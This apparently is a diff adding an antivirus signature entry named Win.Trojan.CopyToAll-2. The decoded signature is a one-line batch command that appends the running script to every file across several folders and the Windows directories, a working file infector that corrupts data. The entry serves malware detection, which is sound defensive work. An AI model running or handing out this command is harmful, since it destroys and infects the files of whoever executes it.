@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.CopyToAll-2
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+for /r \ %%x in (c:\mydocu~1\*.*, c:\*.*, *.*, %windir%\*.*, %winbootdir%\*.*) do copy %%x+%0 %%x
